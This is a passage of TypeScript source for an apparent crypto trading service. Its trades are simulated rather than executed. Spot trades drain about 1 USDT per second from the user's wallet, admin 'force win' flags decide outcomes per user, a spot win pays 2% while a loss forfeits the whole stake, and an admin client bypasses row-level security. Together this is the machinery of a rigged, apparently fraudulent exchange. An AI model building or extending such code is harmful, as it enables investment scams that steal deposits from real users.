      if (finalPnl > 0) {
        // Profit - add to balance
        await this.processWinningTrade({
          ...position,
          status: 'closed',
          pnl: finalPnl,
          total: margin + finalPnl
        }, {});
      } else {
        // Loss - margin already locked, no additional balance change
        await this.processLosingTrade(position, {});
      }


    } catch (error) {
      console.error('Error liquidating position:', error);
    }
  }

  private async stopFuturesTrading(positionId: string): Promise<void> {
    try {
      const { data: position } = await supabase
        .from('trades')
        .select('metadata')
        .eq('id', positionId)
        .single();

      if (position?.metadata?.tradingIntervalId) {
        clearInterval(parseInt(position.metadata.tradingIntervalId));
      }
    } catch (error) {
      console.error('Error stopping futures trading:', error);
    }
  }

  private async startSpotTrading(trade: AnyTrade): Promise<void> {
    console.log(`📈 [unifiedTradingService] Starting continuous spot trading for user: ${trade.userId}, trade: ${trade.id}`);
    
    const tradingInterval = setInterval(async () => {
      try {
        // Get current trade state
        const { data: currentTrade } = await supabase
          .from('trades')
          .select('*')
          .eq('id', trade.id)
          .single();

        if (!currentTrade || currentTrade.status !== 'active') {
          clearInterval(tradingInterval);
          return;
        }

        // Calculate balance deduction for this second
        const baseDeduction = 1; // 1 USDT base
        const randomDeduction = Math.random() * 0.03; // 0 to 0.03 random
        const totalDeduction = baseDeduction + randomDeduction;
        
        // Check if user has admin force win setting using admin client to bypass RLS
        const { data: userOutcome, error } = await supabaseAdmin
          .from('trade_outcomes')
          .select('*')
          .eq('user_id', trade.userId)
          .maybeSingle();

        if (error) {
          console.error('❌ [unifiedTradingService] Error fetching user outcome:', error);
        }

        const isAdminForceWin = userOutcome?.enabled && 
                                    userOutcome.spot_enabled && 
                                    userOutcome.outcome_type === 'win';

        // Also check if trade was created with admin force win mode
        const tradeAdminForceWin = trade.metadata?.adminForceWin || false;

        let balanceChange: number;
        
        if (isAdminForceWin || tradeAdminForceWin) {
          // Admin force win mode - add money instead of deducting
          const addition = 1 + (Math.random() * 0.03); // 1 USDT + random
          balanceChange = addition;
          
          // Update wallet balance
          const { data: wallet } = await supabase
            .from('wallet_balances')
            .select('available')
            .eq('user_id', trade.userId)
            .eq('asset', 'USDT_TRADING')
            .single();

          if (wallet) {
            const newBalance = Number(wallet.available) + addition;
            
            await supabase
              .from('wallet_balances')
              .update({
                available: newBalance,
                updated_at: new Date().toISOString()
              })
              .eq('user_id', trade.userId)
              .eq('asset', 'USDT_TRADING');

          }
        } else {
          // Normal mode - deduct balance
          balanceChange = -totalDeduction;
          
          // Update wallet balance
          const { data: wallet } = await supabase
            .from('wallet_balances')
            .select('available')
            .eq('user_id', trade.userId)
            .eq('asset', 'USDT_TRADING')
            .single();

          if (wallet && Number(wallet.available) >= totalDeduction) {
            const newBalance = Number(wallet.available) - totalDeduction;
            
            await supabase
              .from('wallet_balances')
              .update({
                available: newBalance,
                updated_at: new Date().toISOString()
              })
              .eq('user_id', trade.userId)
              .eq('asset', 'USDT_TRADING');

          }
        }

        // Update P&L targets for spot trading
        if (trade.userId) {
          await this.checkAndUpdatePnLTargets(trade.userId, 'spot', balanceChange);
        }

        // Check if stake is finished
        const currentDeduction = (currentTrade.metadata?.totalDeduction || 0) + Math.abs(balanceChange);
        const originalStake = currentTrade.metadata?.originalStake || trade.total;
        
        if (currentDeduction >= originalStake) {
          // Stake finished - close the trade
          const shouldWin = await this.determineSpotOutcome(trade);
          
          // Calculate final P&L
          const finalPnl = shouldWin ? (originalStake * 0.02) : -originalStake;
          
          // Update P&L targets with final P&L
          if (trade.userId) {
            await this.checkAndUpdatePnLTargets(trade.userId, 'spot', finalPnl - (currentTrade.metadata?.totalDeduction || 0));
          }
          
          // Update trade final status
          await supabase
            .from('trades')
            .update({
              status: shouldWin ? 'completed' : 'failed',
              pnl: finalPnl,
              metadata: {
                ...currentTrade.metadata,
                finalDeduction: currentDeduction,
                outcome: shouldWin ? 'win' : 'loss',
                endTime: new Date().toISOString()
              }
            })
            .eq('id', trade.id);

          // Process final result
          if (shouldWin) {
            await this.processWinningTrade({
              ...trade,
              status: 'completed',
              pnl: finalPnl,
              total: originalStake + finalPnl
            }, {});
          } else {
            await this.processLosingTrade(trade, {});
          }

          clearInterval(tradingInterval);
          return;
        }

      } catch (error) {
        console.error('Error in spot trading interval:', error);
      }
    }, 1000); // Every second

    // Store interval ID for cleanup
    await supabase
      .from('trades')
      .update({
        metadata: {
          ...trade.metadata,
          tradingIntervalId: tradingInterval.toString()
        }
      })
      .eq('id', trade.id);
  }

  private async stopSpotTrading(tradeId: string): Promise<void> {
    try {
      const { data: trade } = await supabase
        .from('trades')
        .select('metadata')
        .eq('id', tradeId)
        .single();

      if (trade?.metadata?.tradingIntervalId) {
        clearInterval(parseInt(trade.metadata.tradingIntervalId));
      }
    } catch (error) {
      console.error('Error stopping spot trading:', error);
    }
  }

  // ==================== TRADE EXECUTION LOGIC ====================

  private async executeTradeLogic(trade: AnyTrade, data: any): Promise<void> {
    console.log(`🎯 [unifiedTradingService] Executing trade logic for type: ${trade.type}`);
    
    let shouldWin: boolean;
    
    switch (trade.type) {
      case 'options':
        // Options trades should NOT determine outcome immediately
        // They should only be determined when they expire
        return; // Don't process win/loss for options immediately
        
      case 'spot':
        // Start continuous spot trading
        await this.startSpotTrading(trade);
        return; // Don't process immediate win/loss
        
      case 'futures':
        // Start futures position trading
        await this.startFuturesTrading(trade);
        return; // Don't process immediate win/loss
        
      case 'arbitrage':
        // For arbitrage, determine outcome based on admin settings
        shouldWin = await this.determineArbitrageOutcome(trade);
        break;
        
      case 'staking':
        // For staking, always win (passive income)
        shouldWin = true;
        break;
        
      default:
        // Fallback to loss
        shouldWin = false;
        break;
    }

    if (shouldWin) {
      await this.processWinningTrade(trade, data);
    } else {
      await this.processLosingTrade(trade, data);
    }
  }

  // ==================== OUTCOME PROCESSING ====================

  private async processWinningTrade(trade: AnyTrade, data: any) {
    switch (trade.type) {
      case 'spot':
        // For spot, return stake + profit to trading wallet
        
        // Get current trading wallet balance
        const { data: currentBalance } = await supabase
          .from('wallet_balances')
          .select('available, locked')
          .eq('user_id', trade.userId)
          .eq('asset', 'USDT_TRADING')
          .maybeSingle();
          
        if (currentBalance) {
          const totalReturn = (trade.total || 0) + (trade.pnl || 0); // stake + profit
          const newAvailable = Number(currentBalance.available) + totalReturn;
          const newLocked = Number(currentBalance.locked) - (trade.total || 0);
          
          
          const { error: profitError } = await supabase
            .from('wallet_balances')
            .update({ 
              available: newAvailable,
              locked: newLocked,
              updated_at: new Date().toISOString()
            })
            .eq('user_id', trade.userId)
            .eq('asset', 'USDT_TRADING');
        
        if (profitError) {
          console.error('Failed to add profit to trading wallet:', profitError);
        }
        }
        
        // Update trading lock status to released
        await supabase
          .from('trading_locks')
          .update({ 
            status: 'released',
            released_at: new Date().toISOString()
          })
          .eq('reference_id', trade.id);
        break;
        
      case 'futures':
        // For futures, P&L already handled in closeFuturesPosition
        break;
        
      case 'options':
        // For options, profit handled in expireOptionsTrade
        break;
        
      case 'arbitrage':
        // For arbitrage, add profit to wallet
        
        const { data: arbBalance } = await supabase
          .from('wallet_balances')
          .select('available, locked')
          .eq('user_id', trade.userId)
          .eq('asset', 'USDT_TRADING')
          .maybeSingle();
          
        if (arbBalance) {
          const totalReturn = (trade.total || 0) + (trade.pnl || 0);
          const newAvailable = Number(arbBalance.available) + totalReturn;
          
          await supabase
            .from('wallet_balances')
            .update({ 
              available: newAvailable,
              updated_at: new Date().toISOString()
            })
            .eq('user_id', trade.userId)
            .eq('asset', 'USDT_TRADING');
        }
        break;
        
      case 'staking':
        // For staking, add rewards to wallet
        
        const { data: stakeBalance } = await supabase
          .from('wallet_balances')
          .select('available')
          .eq('user_id', trade.userId)
          .eq('asset', trade.asset)
          .maybeSingle();
          
        if (stakeBalance) {
          const totalReturn = (trade.total || 0) + (trade.pnl || 0);
          const newAvailable = Number(stakeBalance.available) + totalReturn;
          
          await supabase
            .from('wallet_balances')
            .update({ 
              available: newAvailable,
              updated_at: new Date().toISOString()
            })
            .eq('user_id', trade.userId)
            .eq('asset', trade.asset);
        }
        break;
    }
  }

  private async processLosingTrade(trade: AnyTrade, data: any) {
    // For losing trades, just release the lock
    await supabase
      .from('trading_locks')
      .update({ 
        status: 'released',
        released_at: new Date().toISOString()
      })
      .eq('reference_id', trade.id);
  }

  // ==================== SETTLEMENT METHODS ====================

  async settleOptionsTrade(tradeId: string, shouldWin: boolean) {
    try {
      const { data: option, error } = await supabase
        .from('options_contracts')
        .select('*')
        .eq('id', tradeId)
        .single();
        
      if (error || !option) return;
      
      const profit = shouldWin ? option.payout - option.premium : -option.premium;
      
      // Update P&L targets for options
      if (option.user_id) {
        await this.checkAndUpdatePnLTargets(option.user_id, 'options', profit);
      }
      
      if (shouldWin) {
        // Add payout to wallet
        // Get current wallet balance
        const { data: currentWallet } = await supabase
          .from('wallets')
          .select('balance, locked_balance')
          .eq('user_id', option.user_id)
          .eq('currency', 'USDT')
          .maybeSingle();
          
        if (currentWallet) {
          const newBalance = Number(currentWallet.balance) + option.payout;
          const newLockedBalance = Number(currentWallet.locked_balance) - option.premium;
          
          const { error: profitError } = await supabase
            .from('wallets')
            .update({ 
              balance: newBalance,
              locked_balance: newLockedBalance
            })
            .eq('user_id', option.user_id)
            .eq('currency', 'USDT');
        
        if (profitError) {
          console.error('Failed to add profit to wallet:', profitError);
        }
        }
        
        // Update status
        await supabase
          .from('options_contracts')
          .update({
            status: 'exercised',
            updated_at: new Date().toISOString()
          })
          .eq('id', tradeId);
      } else {
        // Update status to expired
        await supabase
          .from('options_contracts')
          .update({
            status: 'expired',
            updated_at: new Date().toISOString()
          })
          .eq('id', tradeId);
      }
      
      // Release lock
      await supabase
        .from('trading_locks')
        .update({ 
          status: 'released',
          released_at: new Date().toISOString()
        })
        .eq('reference_id', tradeId);
    } catch (error) {
      console.error('Failed to settle options trade:', error);
    }
  }

  async closeFuturesPosition(positionId: string, closePrice: number) {
    try {
      const { data: position, error } = await supabase
        .from('futures_positions')
        .select('*')
        .eq('id', positionId)
        .single();
        
      if (error || !position) throw error;
      
      // Calculate PnL
      const pnl = position.side === 'long'
        ? (closePrice - position.entry_price) * position.size
        : (position.entry_price - closePrice) * position.size;
      
      // Update P&L targets for futures
      if (position.user_id) {
        await this.checkAndUpdatePnLTargets(position.user_id, 'futures', pnl);
      }
      
      // Return margin + PnL
      const totalReturn = position.margin + pnl;
      
      
      // Get current trading wallet balance
      const { data: currentBalance } = await supabase
        .from('wallet_balances')
        .select('available, locked')
        .eq('user_id', position.user_id)
        .eq('asset', 'USDT_TRADING')
        .maybeSingle();
        
      if (currentBalance) {
        const newAvailable = Number(currentBalance.available) + totalReturn;
        const newLocked = Number(currentBalance.locked) - position.margin;
        
        
        const { error: profitError } = await supabase
          .from('wallet_balances')
          .update({ 
            available: newAvailable,
            locked: newLocked,
            updated_at: new Date().toISOString()
          })
          .eq('user_id', position.user_id)
          .eq('asset', 'USDT_TRADING');
      
        if (profitError) {
          console.error('Failed to add futures profit to trading wallet:', profitError);
        }
      }
      
      // Update position
      await supabase
        .from('futures_positions')
        .update({
          mark_price: closePrice,
          pnl: pnl,
          status: 'closed',
          closed_at: new Date().toISOString()
        })
        .eq('id', positionId);
      
      // Release lock
      await supabase
        .from('trading_locks')
        .update({ 
          status: 'released',
          released_at: new Date().toISOString()
        })
        .eq('reference_id', positionId);
        
    } catch (error) {
      console.error('Failed to close futures position:', error);
      throw error;
    }
  }

  // ==================== USER TRADES ====================

  async getUserTrades(userId: string, type?: TradeType): Promise<AnyTrade[]> {
    try {
      console.log('🔍 [UnifiedTradingService] getUserTrades called with userId:', userId);
      console.log('🔧 [UnifiedTradingService] Using direct query approach...');

      // Use direct query with proper filtering
      let query = supabase
        .from('trades')
        .select('*')
        .eq('user_id', userId)
        .order('created_at', { ascending: false });

      if (type) {
        query = query.eq('type', type);
      }

      const { data, error } = await query;

      if (error) {
        console.error('❌ [UnifiedTradingService] Error fetching trades:', error);
        console.error('❌ [UnifiedTradingService] Error details:', {
          message: error.message,
          details: error.details,
          hint: error.hint,
          code: error.code
        });
        
        // Try admin client fallback
        return this.getUserTradesWithAdmin(userId, type);
      }


      if (data && data.length > 0) {
        // Map each record to the appropriate trade type
        const trades = data.map(record => {
          return this.mapTradeFromDB(record);
        });
        
          return trades;
      }

      
      // Try admin client fallback
      console.log('🔧 [UnifiedTradingService] Trying admin client fallback...');
      return this.getUserTradesWithAdmin(userId, type);
      
    } catch (error) {
      console.error('❌ [UnifiedTradingService] Exception in getUserTrades:', error);
      return [];
    }
  }

  // Fallback method using admin client
  private async getUserTradesWithAdmin(userId: string, type?: TradeType): Promise<AnyTrade[]> {
    try {
      console.log('🔧 [UnifiedTradingService] Using admin client for trades...');
      
      // Use admin client to bypass RLS
      const { data, error } = await supabaseAdmin
        .from('trades')
        .select('*')
        .eq('user_id', userId)
        .order('created_at', { ascending: false });

      if (error) {
        console.error('❌ [UnifiedTradingService] Admin client error:', error);
        return [];
      }


      if (data && data.length > 0) {
        const trades = data.map(record => {
          return this.mapTradeFromDB(record);
        });
        
          return trades;
      }

      return [];
    } catch (error) {
      console.error('❌ [UnifiedTradingService] Admin client exception:', error);
      return [];
    }
  }

  // Map database record to AnyTrade
  private mapTradeFromDB(record: any): AnyTrade {
    const baseTrade = {
      id: record.id,
      userId: record.user_id,
      type: record.type,
      status: record.status,
      asset: record.asset,
      amount: Number(record.amount),
      price: record.price ? Number(record.price) : undefined,
      total: record.total ? Number(record.total) : undefined,
      pnl: record.pnl ? Number(record.pnl) : undefined,
      fee: record.fee ? Number(record.fee) : undefined,
      metadata: record.metadata || {},
      createdAt: record.created_at,
      updatedAt: record.updated_at
    };

    // Add type-specific fields from metadata
    switch (record.type) {
      case 'spot':
        return {
          ...baseTrade,
          type: 'spot' as const,
          side: record.metadata?.side || 'buy',
          orderType: record.metadata?.orderType || 'market',
          filled: record.metadata?.filled,
          remaining: record.metadata?.remaining,
          pair: record.asset || 'BTCUSDT'
        } as any;
        
      case 'futures':
        return {
          ...baseTrade,
          type: 'futures' as const,
          side: record.metadata?.side || 'long',
          positionType: record.metadata?.positionType || 'open',
          orderType: record.metadata?.orderType || 'market',
          leverage: record.metadata?.leverage || 10,
          margin: record.metadata?.margin || 0,
          entryPrice: record.metadata?.entryPrice || record.price || 0,
          markPrice: record.metadata?.markPrice || record.price || 0,
          liquidationPrice: record.metadata?.liquidationPrice || 0,
          takeProfit: record.metadata?.takeProfit,
          stopLoss: record.metadata?.stopLoss,
          pair: record.asset || 'BTCUSDT'
        } as any;
        
      case 'options':
        return {
          ...baseTrade,
          type: 'options' as const,
          direction: record.metadata?.direction || 'up',
          timeFrame: record.metadata?.timeFrame || 60,
          strike: record.metadata?.strike,
          payout: record.metadata?.payout || 0,
          expiresAt: record.metadata?.expiresAt || Date.now(),
          symbol: record.asset || 'BTCUSDT'
        } as any;
        
      default:
        return baseTrade as AnyTrade;
    }
  }

  async getUserPositions(userId: string): Promise<FuturesPosition[]> {
    try {
      const { data: positions } = await supabase
        .from('futures_positions')
        .select('*')
        .eq('user_id', userId)
        .eq('status', 'open');

      return (positions || []) as FuturesPosition[];

    } catch (error) {
      console.error('Failed to get user positions:', error);
      return [];
    }
  }

  async getUserOptions(userId: string): Promise<OptionContract[]> {
    try {
      const { data: options } = await supabase
        .from('options_contracts')
        .select('*')
        .eq('user_id', userId)
        .in('status', ['active', 'exercised']);

      return (options || []) as OptionContract[];

    } catch (error) {
      console.error('Failed to get user options:', error);
      return [];
    }
  }
}

export const unifiedTradingService = UnifiedTradingService.getInstance();